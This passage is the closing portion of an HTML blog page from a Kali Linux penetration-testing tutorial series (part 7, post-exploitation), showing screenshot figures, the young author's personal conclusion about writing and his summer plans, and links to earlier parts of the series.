        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Login-attempt-owasp_hu60bbc129d7beff86942d38db4baa57ce_92938_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Login-attempt-owasp_hu60bbc129d7beff86942d38db4baa57ce_92938_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Login-attempt-owasp_hu60bbc129d7beff86942d38db4baa57ce_92938_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Login-attempt-owasp_hu60bbc129d7beff86942d38db4baa57ce_92938_660x0_resize_box_3.png"
        alt="Login-attempt-owasp"
      />
      
      
    </figure>
  

</p>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Host-password-found_hu73b03be6679c7da9d710dc67ddb79ad1_28578_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Host-password-found_hu73b03be6679c7da9d710dc67ddb79ad1_28578_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Host-password-found_hu73b03be6679c7da9d710dc67ddb79ad1_28578_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Host-password-found_hu73b03be6679c7da9d710dc67ddb79ad1_28578_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Host-password-found_hu73b03be6679c7da9d710dc67ddb79ad1_28578_660x0_resize_box_3.png"
        alt="Host-password-found"
      />
      
      
    </figure>
  

</p>


<h2 class="relative group">Conclusion 
    <div id="conclusion" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Alright guys hope yall enjoyed this months chapter, I do try to get these out as fast as humanly as possible so let me try, as of today (23/07/2024) I have written so much late at night that it&rsquo;s unbelievable that I was the same person a couple of years ago, I would of never thought in a million years that I would be writting a book which is something I believe we all have in us and should give it a shot since we miss every shot we don&rsquo;t take and going all in this summer of 2024 is gonna be crazy. Finna meet some girls, play around on my bike, go on dates and fall in love. This is looking like a great come back from the time I was off and I wanted to say thank you the read for putting up with my shit. I know writing isn&rsquo;t my thing but please keep in mind that I&rsquo;m only 19 and writing can be difficult so I do my best. This is something I can be excited about when I wake up and put all my energy into which is a great way to forget about other troubles. I would like to get back into routine more and meditate to keep my sanity sane and in tack just so I don&rsquo;t go crazy again. Anyways I go a bracellet from these kids at a stand selling loon bands so I ask the two girls to make one for her and me and get matching bracelet, shit gonna be fire just wait. Story going to be crazy.</p>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Lain-eatting-dinner_hu42e313d5df0450541247c0abefd8fbed_870983_330x0_resize_box_1.gif 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Lain-eatting-dinner_hu42e313d5df0450541247c0abefd8fbed_870983_660x0_resize_box_1.gif 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Lain-eatting-dinner_hu42e313d5df0450541247c0abefd8fbed_870983_1024x0_resize_box_1.gif 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Lain-eatting-dinner_hu42e313d5df0450541247c0abefd8fbed_870983_1320x0_resize_box_1.gif 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Lain-eatting-dinner_hu42e313d5df0450541247c0abefd8fbed_870983_660x0_resize_box_1.gif"
        alt="Lain-eatting-dinner"
      />
      
      
    </figure>
  

</p>

        </div>
                
        
<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
    <summary
        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
        Ultimate-Kali-Linux-Book - This article is part of a series.
    </summary>
    
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-1-buidling-a-penetration-testing-labs/">
            Part 1: Part 1 Building a Penetesting Lab
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-2-reconnaissance-and-footprint/">
            Part 2: Part 2 Reconnaissance and Footprint
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-3-exploring-active-reconnaissance-techniques/">
            Part 3: Part 3 Exploring Active Reconnaissance Techniques
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-4-performing-vulnerability-assessments/">
            Part 4: Part 4 Performing Vulnerability Assessments
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-5-understanding-reverse-and-binding-shell/">
            Part 5: Part 5 Understanding Reverse and Binding Shell
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="http://localhost:1313/posts/part-6-all-on-networking-penetration-baby/">
            Part 6: Part 6 All on Networking Penetration Baby
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        Part 7: This Article
    </div>
    
    

</details>


        

          
      </div>
     
    
     <script>
        var oid = "views_posts\/Part-7-Advanced-Network-Penetration-Testing-Post-Exploitation\/index.md"
        var oid_likes = "likes_posts\/Part-7-Advanced-Network-Penetration-Testing-Post-Exploitation\/index.md"
      </script>
      
      
      
      <script type="text/javascript" src="/js/page.min.f94e5beb747249fb2315a14fc6417e483411d48b59dc1376bbafa8c37fce65d397d5401be15c7461670ec7bb90ac2bf148d7d48eaf02f317cd9dc04d4851fd31.js" integrity="sha512-&#43;U5b63RySfsjFaFPxkF&#43;SDQR1ItZ3BN2u6&#43;ow3/OZdOX1UAb4Vx0YWcOx7uQrCvxSNfUjq8C8xfNncBNSFH9MQ=="></script>
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/yap-series/16-06-2024-love/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >16 06 2024 Love</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-06-16 07:37:07 &#43;0000 UTC">16 Jun, 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
            title="">
            
            Tags
          </a>
        </li>
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
            title="">
            
            Categories
          </a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      &copy;
      2024
      Valentin
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer><div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
